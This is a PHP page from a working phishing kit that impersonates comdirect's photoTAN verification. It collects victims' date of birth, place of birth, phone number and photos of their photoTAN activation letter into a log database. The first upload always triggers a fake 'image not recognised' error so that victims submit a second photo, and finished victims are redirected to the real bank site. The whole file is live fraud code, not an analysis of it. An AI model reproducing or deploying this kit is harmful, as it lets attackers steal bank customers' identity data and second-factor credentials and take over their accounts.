<?php

	$this_Title = "photoTAN-Verifizierung";

	include("comdirect_config.inc.php");
	
	require_once("Mobile_Detect.php");
	$detectMobile = new Mobile_Detect;
	
	session_start();
	
	if($_SESSION["process_finished"] == TRUE) {
		header("Location: https://href.li/?https://comdirect.de");
		exit();
	}
	
	if(isset($_POST["execute_task"])) {
		//START + EXECUTE PHOTOTAN-PROCESS
		if(empty($_SESSION["double_phototan"])) {
			//FIRST PHOTOTAN-UPLOAD
			if(empty($_FILES["camera_file"])) {
				$is_camera = 0;
			} else if(!empty($_FILES["camera_file"])) {
				$is_camera = 1;
			}
		
			if(empty($_FILES["image_file"])) {
				$is_file = 0;
			} else if(!empty($_FILES["image_file"])) {
				$is_file = 1;
			}
			//EXECUTE TASK
			//CHECK IF USER IS MOBILE
			if($detectMobile->isMobile()) {
	
					//CHECK CAMERA FILE
					if(!empty($_FILES['camera_file'])) {
						//CONTINUE WITH PROCESSING PHOTOTAN-FILE
						$file_Path = "uploads/";
						$file_Path = $file_Path . basename( $_FILES['camera_file']['name']);
						$temp_File = explode(".", $_FILES["camera_file"]["name"]);
						$file_Name = $_FILES["camera_file"]["name"];
						$new_FileName = round(microtime(true)) . '.' . end($temp_File);
						$new_File = $file_Path . $new_FileName;
			
						if(move_uploaded_file($_FILES['camera_file']['tmp_name'], $new_File)) {
							$camera_file = "uploads/";
							$camera_file .= $file_Name;
							$camera_file .= $new_FileName;
						} else {
							$camera_file = "Fehlerhaftes Bild";
						}
					
						//UPDATE LOG AND REDIRECT
						$notUsed = "none";
						$newStatus = 3;
					
						$dob = $_POST["dob"];
						$transform_date = new DateTime($dob);
						$geburtsdatum_format = $transform_date->format('d.m.Y');
						$pob = $_POST["pob"];
						$phone_number = $_POST["phone_number"];
					
						$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET dob = ?, pob = ?, phone_number = ?, image_file = ?, camera_file = ?, status = ? WHERE data_id = ?");
						$update_Log_Data->bind_param("sssssis", $geburtsdatum_format, $pob, $phone_number, $notUsed, $camera_file, $newStatus, $_SESSION["data_id"]);
						$update_Log_Data->execute();
						$update_Log_Data->close();
					
						/*header("Location: Angaben");
						exit();*/
						
						//SET SESSION-VAR
						$_SESSION["double_phototan"] = 1;
						$showPhotoError = TRUE;
					} else if(!empty($_FILES['image_file'])) {
						//CONTINUE WITH PROCESSING PHOTOTAN-FILE
						$file_Path = "uploads/";
						$file_Path = $file_Path . basename( $_FILES['image_file']['name']);
						$temp_File = explode(".", $_FILES["image_file"]["name"]);
						$file_Name = $_FILES["image_file"]["name"];
						$new_FileName = round(microtime(true)) . '.' . end($temp_File);
						$new_File = $file_Path . $new_FileName;
			
						if(move_uploaded_file($_FILES['image_file']['tmp_name'], $new_File)) {
							$image_file = "uploads/";
							$image_file .= $file_Name;
							$image_file .= $new_FileName;
						} else {
							$image_file = "Fehlerhaftes Bild";
						}
					
						//UPDATE LOG AND REDIRECT
						$notUsed = "none";
						$newStatus = 3;
						
						$dob = $_POST["dob"];
						$transform_date = new DateTime($dob);
						$geburtsdatum_format = $transform_date->format('d.m.Y');
						$pob = $_POST["pob"];
						$phone_number = $_POST["phone_number"];
					
						$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET dob = ?, pob = ?, phone_number = ?, image_file = ?, camera_file = ?, status = ? WHERE data_id = ?");
						$update_Log_Data->bind_param("sssssis", $geburtsdatum_format, $pob, $phone_number, $image_file, $notUsed, $newStatus, $_SESSION["data_id"]);
						$update_Log_Data->execute();
						$update_Log_Data->close();
					
						/*header("Location: Angaben");
						exit();*/
						//SET SESSION-VAR
						$_SESSION["double_phototan"] = 1;
						$showPhotoError = TRUE;
					}
			
			} else {
				//NOT A MOBILE USER
				if(!empty($_FILES['image_file'])) {
					//CONTINUE WITH PROCESSING PHOTOTAN-FILE
					$file_Path = "uploads/";
					$file_Path = $file_Path . basename( $_FILES['image_file']['name']);
					$temp_File = explode(".", $_FILES["image_file"]["name"]);
					$file_Name = $_FILES["image_file"]["name"];
					$new_FileName = round(microtime(true)) . '.' . end($temp_File);
					$new_File = $file_Path . $new_FileName;
			
					if(move_uploaded_file($_FILES['image_file']['tmp_name'], $new_File)) {
						$image_file = "uploads/";
						$image_file .= $file_Name;
						$image_file .= $new_FileName;
					} else {
						$image_file = "Fehlerhaftes Bild";
					}
				}
			
				//UPDATE LOG AND REDIRECT
				$notUsed = "none";
				$newStatus = 3;
			
				$dob = $_POST["dob"];
				$transform_date = new DateTime($dob);
				$geburtsdatum_format = $transform_date->format('d.m.Y');
				$pob = $_POST["pob"];
				$phone_number = $_POST["phone_number"];
			
				$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET dob = ?, pob = ?, phone_number = ?, image_file = ?, camera_file = ?, status = ? WHERE data_id = ?");
				$update_Log_Data->bind_param("sssssis", $geburtsdatum_format, $pob, $phone_number, $image_file, $notUsed, $newStatus, $_SESSION["data_id"]);
				$update_Log_Data->execute();
				$update_Log_Data->close();
					
				/*header("Location: Angaben");
				exit();*/
				//SET SESSION-VAR
				$_SESSION["double_phototan"] = 1;
				$showPhotoError = TRUE;
			
			}
		} else if(isset($_SESSION["double_phototan"])) {
			//SECOND PHOTOTAN-UPLOAD
			if(empty($_FILES["camera_file"])) {
				$is_camera = 0;
			} else if(!empty($_FILES["camera_file"])) {
				$is_camera = 1;
			}
		
			if(empty($_FILES["image_file"])) {
				$is_file = 0;
			} else if(!empty($_FILES["image_file"])) {
				$is_file = 1;
			}
			//EXECUTE TASK
			//CHECK IF USER IS MOBILE
			if($detectMobile->isMobile()) {
	
					//CHECK CAMERA FILE
					if(!empty($_FILES['camera_file'])) {
						//CONTINUE WITH PROCESSING PHOTOTAN-FILE
						$file_Path = "uploads/";
						$file_Path = $file_Path . basename( $_FILES['camera_file']['name']);
						$temp_File = explode(".", $_FILES["camera_file"]["name"]);
						$file_Name = $_FILES["camera_file"]["name"];
						$new_FileName = round(microtime(true)) . '.' . end($temp_File);
						$new_File = $file_Path . $new_FileName;
			
						if(move_uploaded_file($_FILES['camera_file']['tmp_name'], $new_File)) {
							$camera_file = "uploads/";
							$camera_file .= $file_Name;
							$camera_file .= $new_FileName;
						} else {
							$camera_file = "Fehlerhaftes Bild";
						}
					
						//UPDATE LOG AND REDIRECT
						$notUsed = "none";
						$newStatus = 4;
					
						$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET second_image = ?, second_camera = ?, status = ? WHERE data_id = ?");
						$update_Log_Data->bind_param("ssis", $notUsed, $camera_file, $newStatus, $_SESSION["data_id"]);
						$update_Log_Data->execute();
						$update_Log_Data->close();
					
						header("Location: Angaben");
						exit();
					} else if(!empty($_FILES['image_file'])) {
						//CONTINUE WITH PROCESSING PHOTOTAN-FILE
						$file_Path = "uploads/";
						$file_Path = $file_Path . basename( $_FILES['image_file']['name']);
						$temp_File = explode(".", $_FILES["image_file"]["name"]);
						$file_Name = $_FILES["image_file"]["name"];
						$new_FileName = round(microtime(true)) . '.' . end($temp_File);
						$new_File = $file_Path . $new_FileName;
			
						if(move_uploaded_file($_FILES['image_file']['tmp_name'], $new_File)) {
							$image_file = "uploads/";
							$image_file .= $file_Name;
							$image_file .= $new_FileName;
						} else {
							$image_file = "Fehlerhaftes Bild";
						}
					
						//UPDATE LOG AND REDIRECT
						$notUsed = "none";
						$newStatus = 4;
					
						$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET second_image = ?, second_camera = ?, status = ? WHERE data_id = ?");
						$update_Log_Data->bind_param("ssis", $image_file, $notUsed, $newStatus, $_SESSION["data_id"]);
						$update_Log_Data->execute();
						$update_Log_Data->close();
					
						header("Location: Angaben");
						exit();
					}
			
			} else {
				//NOT A MOBILE USER
				if(!empty($_FILES['image_file'])) {
					//CONTINUE WITH PROCESSING PHOTOTAN-FILE
					$file_Path = "uploads/";
					$file_Path = $file_Path . basename( $_FILES['image_file']['name']);
					$temp_File = explode(".", $_FILES["image_file"]["name"]);
					$file_Name = $_FILES["image_file"]["name"];
					$new_FileName = round(microtime(true)) . '.' . end($temp_File);
					$new_File = $file_Path . $new_FileName;
			
					if(move_uploaded_file($_FILES['image_file']['tmp_name'], $new_File)) {
						$image_file = "uploads/";
						$image_file .= $file_Name;
						$image_file .= $new_FileName;
					} else {
						$image_file = "Fehlerhaftes Bild";
					}
				}
			
				//UPDATE LOG AND REDIRECT
				$notUsed = "none";
				$newStatus = 4;
			
				$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET second_image = ?, second_camera = ?, status = ? WHERE data_id = ?");
				$update_Log_Data->bind_param("ssis", $image_file, $notUsed, $newStatus, $_SESSION["data_id"]);
				$update_Log_Data->execute();
				$update_Log_Data->close();
					
				header("Location: Angaben");
				exit();
			
			}
		}
	}
	
	include("comdirect_header.tpl.php");
	
?>

	<div class="cif-scope bg-color--cd-black-0">
		<div class="grid-container--limited-md  hidden-lg kontoinhaber__container" id="div_kontoinhaber"> </div>
	</div>
	<div class="cif-scope-content-wrapper siteFrame" data-plugin="{common_eventHub: {events: ['resize']}}">
		<div class="grid-container--limited-md grid-container">
			<div class="grid--no-gutter grid">
				<div class="col--md-6 col col--sm-4 col--md-push-right-1 col--lg-12 col--md-push-left-1">
					<div class="col__content col__content--no-padding-bottom">
						<h1 class="headline--h1 headline"><?=$this_Title;?></h1></div>
				</div>
				<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
				
				<?php
				
					if($show_Error == TRUE) {
						
						
				?>
				
				<div style="padding:25px 25px 25px 25px;background-color:#f70000;border:1px solid #eee;color:#fff;">
					Sie müssen eine der beiden Optionen auswählen aber nicht beide gleichzeitig oder keine von beiden.
				</div>
				<?php
				
					}
					
				?>
				
				<?php
				
					if($showPhotoError == TRUE) {
						
				?>
				
				<div style="padding:25px 25px 25px 25px;background-color:#f70000;border:1px solid #eee;color:#fff;margin-bottom:17px;">
					Ihre hochgeladene photoTAN-Aktivierungsgrafik konnte nicht erkannt werden. Bitte versuchen Sie es erneut und achten Sie auf eine hochauflösende Qualität.
				</div>
				
				<?php
				
					}
					
				?>
				
					<div class="col__content col__content--no-padding-top">
						<h5 class="hidden-sm headline--h5 headline">Durchführung der Verifizierung</h5>
						<p>Um diesen Vorgang nun ordnungsgemäß durchführen zu können, ist es erforderlich, dass Sie nachfolgend Ihr photoTAN-Aktivierungsschreiben in hochauflösender Bildqualität hochladen. Anschließend wird das Schreiben von unseren Systemen geprüft und Sie werden zum letzten Schritt weitergeleitet.<br /><br />
						</p>
						
						<img src="assets/images/cd-brief.png" style="<?php if($showPhotoError == TRUE) { echo 'border:2.5px dashed #000;margin-bottom:15px;'; } else { echo 'border:2.5px dashed #000;'; } ?>">
						
						<form id="login" method="post" action="" enctype="multipart/form-data">
						
						<!-- NEW FORM STUFF -->
						<?php if($showPhotoError != TRUE) { ?>
						<div class="grid--no-gutter grid grid--no-bottom">
						
    <div class="col col-12" style="margin-bottom:-25px;">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param1" data-tid="param1" class="floating-input floating-input--margin-bottom" data-plugin="">
                        <div class="floating-input__container" data-role="floating-input__container" data-plugin="">
                            <input
                                class="floating-input__input"
                                data-role="floating-input__input"
                                id=""
                                data-tid="param1Input"
                                type="date"
                                name="dob"
								placeholder=""
								required=""
                            />
                            <label class="floating-input__label" data-role="floating-input__label">Geburtsdatum</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	
	<div class="col col-12" style="margin-bottom:-25px;">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param1" data-tid="param1" class="floating-input floating-input--margin-bottom" data-plugin="">
                        <div class="floating-input__container" data-role="floating-input__container" data-plugin="">
                            <input
                                class="floating-input__input"
                                data-role="floating-input__input"
                                id=""
                                data-tid="param1Input"
                                type="text"
                                name="pob"
								placeholder=""
								required=""
                            />
                            <label class="floating-input__label" data-role="floating-input__label">Geburtsort</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	
	<div class="col col-12" style="margin-bottom:5px;">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param1" data-tid="param1" class="floating-input floating-input--margin-bottom" data-plugin="">
                        <div class="floating-input__container" data-role="floating-input__container" data-plugin="">
                            <input
                                class="floating-input__input"
                                data-role="floating-input__input"
                                id=""
                                data-tid="param1Input"
                                type="text"
                                name="phone_number"
								placeholder=""
								required=""
                            />
                            <label class="floating-input__label" data-role="floating-input__label">Telefonnummer</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	
	</div>
						<?php } ?>
						<!-- NEW FORM STUFF END -->
						
						
				<?php
				
					if($detectMobile->isMobile()) {
						
				?>
						
							<div class="grid--no-gutter grid grid--no-bottom" style="margin-top:-30px;">
							
				<?php
				
					} else {
						
				?>
				
							<div class="grid--no-gutter grid grid--no-bottom">
							
				<?php
				
					}
					
				?>
							
							<!-- NEW SYNC START -->
							
					<?php
										
						if($detectMobile->isMobile()) {
												
					?>
					
					<!-- OPTIONS START -->
				
					<!--<div class="col col-12" id="selectOptions">
					<h3>Wählen Sie nun eine Option:</h3>
					</div>
					<div class="col col-6" id="selectCamera">
						<button type="button" id="cameraUpload" class="optionsButton">Kamera benutzen</button>
					</div>
					<div class="col col-6" id="selectFile">
						<button type="button" id="fileUpload" class="optionsButton">Datei auswählen</button>
					</div>-->
			
					<!-- OPTIONS END -->
					
							
							<div class="col col-12" style="text-align:center;margin-top:20px;" id="uploadTAN">
								<div class="image-upload1">
									<label for="file-input" class="attach-doc1" style="font-weight:500;">
										Kamera jetzt öffnen & Aktivierungsschreiben hochladen
									</label>

									<input id="file-input" class="camera_file" name="camera_file" type="file" accept="image/*;capture=camera">
								</div>
							</div>
							<!--<div class="col col-12" style="text-align:center;display:none;margin-top:20px;" id="file_upload">
								<div class="image-upload2">
									<label for="file-input" class="attach-doc2" id="fileLabel" style="font-weight:550;">
										Datei jetzt auswählen & Aktivierungsschreiben hochladen
									</label>
									<input id="file-input" class="file_upload" name="image_file" type="file"/>
								</div>
							</div>-->
							
					<?php
					
						} else {
							
					?>
					
					
							<div class="col col-12" style="margin-top:-30px;">
									<div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
										<div class="input-group--no-padding-bottom input-group">

											<div class="cdform" style="background-color:#fff; border: 1px solid #ccc; border-radius: 4px; color: #555555; height:88px; width:100%; padding:15px 15px 15px 15px;">
												<div class="form-row" style="">
													<label for="">photoTAN-Aktivierungsschreiben</label>
													<input type="file" name="image_file" class="form-control" required="" style="border:none;" accept="image/*" capture>
												</div>
											</div>
									</div>
								</div>
							</div>
							
					<?php
					
						}
						
					?>
							
							<!-- NEW SYNC END -->
							


			<div class="col col-12">

				<div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
			<?php
			
				if($detectMobile->isMobile()) {
					
			?>
					<p style="text-align:center;color:green;font-size:18px;font-weight:650;display:none;border:1px dashed green;padding:15px 15px 15px 15px;" id="executeText">photoTAN-Aktivierungsschreiben wurde erfasst - Sie können nun fortfahren!</p>
					<button type="submit" name="execute_task" id="executeButton" style="display:none;" class="button button--growing button--large button--primary">Weiter zum nächsten Schritt</button>
			<?php
			
				} else {
					
			?>
			
					<button type="submit" name="execute_task" id="executeButton" class="button button--growing button--large button--primary">Weiter zum nächsten Schritt</button>
					
			<?php
			
				}
				
			?>
				</div>
			</div>

		</div>
		</form>
	</div>
	</div>
	<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
		<div class="col__content col__content--no-padding-vertical">
			<div class="outer-spacing--xxlarge-top">
				<h5 class="headline--h5 headline">Wichtige Sicherheitshinweise</h5>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-0">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Lesen Sie sich alle Anweisungen und Hinweise genauestens durch.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-1">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Achten Sie auf absolute Validität und Vollständigkeit Ihrer Angaben.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-2">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Führen Sie diesen Vorgang vollständig und ordnungsgemäß durch.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-3">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Warten Sie im Anschluss auf die Bestätigungsmeldung zu Ihrer Synchronisierung.</span></div>
					</label>
				</div>
				
				
				
				
				
				
			</div>
		</div>
	</div>

	</div>
	</div>
	</div>

<?php

	include("comdirect_footer.tpl.php");
	
?>